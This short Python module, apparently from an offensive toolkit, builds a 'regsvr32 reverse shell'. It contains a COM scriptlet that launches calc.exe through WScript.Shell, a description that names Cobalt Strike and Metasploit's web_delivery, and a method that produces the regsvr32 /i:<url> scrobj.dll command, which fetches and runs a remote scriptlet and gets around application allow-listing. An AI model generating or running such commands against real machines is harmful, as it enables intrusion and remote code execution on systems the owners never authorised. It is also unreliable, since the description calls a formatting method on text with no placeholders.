# encoding: utf8
from .config import *


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'regsvr32 reverse shell',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
Regsvr32命令注入,用于注册动态链接库文件,向系统注册控件或者卸载控件的命令
C2         -> Cobalt 
Language   -> vbs
Platform   -> All

msf5 exploit(multi/script/web_delivery)

""".format(lhost, port_msf)

        self.vbs = """
<?XML version="1.0"?>
<scriptlet>
    <registration progid="UQCSRt8b" classid="{cf632e36-9f14-3b29-31f5-77aa939758fb}">
        <script>
            <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe",0);]]>
        </script>
    </registration>
</scriptlet>
"""

    def reverse(self, url):
        return "regsvr32 /s /n /u /i:{0} scrobj.dll".format(url)
